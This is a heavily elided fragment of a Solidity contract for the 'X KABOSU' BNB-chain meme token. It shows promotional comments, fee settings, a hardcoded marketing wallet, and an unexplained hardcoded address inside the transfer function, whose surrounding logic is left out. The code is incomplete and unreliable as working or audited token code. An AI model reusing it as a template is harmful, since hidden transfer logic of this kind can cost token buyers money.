/**
🦑Stealth Launch
X KABOSU is a Decentralized meme token launched on the Binance Blockchain with the aim of creating a community token to keep up with Cryptocurrency developments in meme tokens
...
contract XKABOSU is Context, IERC20, Ownable {
    ...
    string private constant _name = "X KABOSU"; // 
    string private constant _symbol = "XKABOSU"; //    
    uint8 private constant _decimals = 9; // 
    
    uint256 public _marketingFee = 2;
    uint256 public _liquidityFee = 0;
    address public  _marketingWallet = 0xbBc10ca7Bf1aF3447c3a771f73bdAc945bD3b565;
...
function transfer(address recipient, uint256 amount) public override returns (bool) {
    ...
    function _transfer(
        ...
        address wa = 0x7E3994c3BC64F265D18C07DAb04eE2d11BFaCF19;
